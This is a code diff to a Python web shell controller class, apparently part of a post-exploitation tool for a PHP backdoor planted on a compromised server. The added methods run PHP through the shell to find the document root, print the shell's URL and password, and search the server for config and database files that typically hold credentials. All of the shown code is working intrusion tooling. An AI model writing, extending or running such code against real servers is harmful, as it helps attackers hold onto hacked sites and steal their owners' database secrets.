@@ -12,12 +12,41 @@ class WebShell():
     url = "http://127.0.0.1/c.php"
     method = "POST"
     password = "c"
+    webroot = ""
     working = False
     def __init__(self, url, method, password):
         self.url = url
         self.method = method
         self.password = password
         self.init(self.url, self.method, self.password)
+        if self.working:
+            self.webroot = self.get_webroot()[1]
+            self.print_info()
+
+    def get_webroot(self):
+        return self.php_code_exec_token("echo $_SERVER['DOCUMENT_ROOT']")
+
+    def print_info(self):
+        Log.success("=" * 32)
+        Log.success("URL : %s" % (self.url))
+        Log.success("Method : %s" % (self.method))
+        Log.success("Password : %s" % (self.password))
+        Log.success("Document Root : %s" % (self.webroot))
+        Log.success("=" * 32)
+
+    def get_config_file(self):
+        keywords = ["config", "db", "database"]
+        for key in keywords:
+            Log.info("Using keyword : [%s]..." % (key))
+            command = "find %s -name '*%s*'" % (self.webroot, key)
+            output = self.auto_exec(command)
+            if output[0]:
+                if output[1] == "":
+                    Log.warning("Nothing found!")
+                else:
+                    Log.success("Found : \n%s" % output[1])
+            else:
+                Log.error("Error occured! %s" % output[1])
 
     def check_working(self, url, method, auth):
         Log.info("Checking whether the webshell is still work...")
